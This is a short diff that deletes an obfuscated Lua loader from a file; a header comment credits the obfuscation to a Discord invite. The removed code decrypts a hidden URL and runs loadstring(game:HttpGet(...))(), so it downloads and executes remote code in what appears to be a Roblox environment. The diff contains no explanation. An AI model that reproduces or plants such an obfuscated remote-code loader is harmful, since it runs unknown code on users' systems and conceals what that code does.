@@ -1,6 +1,0 @@
---[[
-
-obfuscated @ discord.gg/25ms
-
---]]
-local C,J do local L=math.floor local Z=math.random local c=table.remove local O=string.char local w=0 local A=2 local s={}local y={}local x=0 local i={}for J=1,256,1 do(i)[J]=J end repeat local J=Z(1,#i)local C=c(i,J);(y)[C]=O(C-1)until#i==0 local j={}local function m()if#j==0 then w=(w*129+31239505136597)%35184372088832 repeat A=(A*230)%257 until A~=1 local J=A%32 local C=(L(w/2^(13-(A-J)/32))%4294967296.0)/2^J local Z=L((C%1)*4294967296.0)+L(C)local c=Z%65536 local O=(Z-c)/65536 local s=c%256 local y=(c-s)/256 local x=O%256 local i=(O-x)/256 j={s;y,x;i}end return table.remove(j)end local k={}C=setmetatable({},{__index=k,__metatable=nil})function J(C,L)local Z=k if(Z)[L]then else j={}local J=y w=L%35184372088832 A=L%255+2 local c=string.len(C);(Z)[L]=""local O=7 for c=1,c,1 do O=((string.byte(C,c)+m())+O)%256;(Z)[L]=(Z)[L]..(J)[O+1]end end return L end end;(loadstring(game:HttpGet((C)[J(".\142}\251\025U+?\180`\015:W\203\160\169\001\184@<\183\0922+s\241\229\176\163\220\253\189",29463555320378)])))()
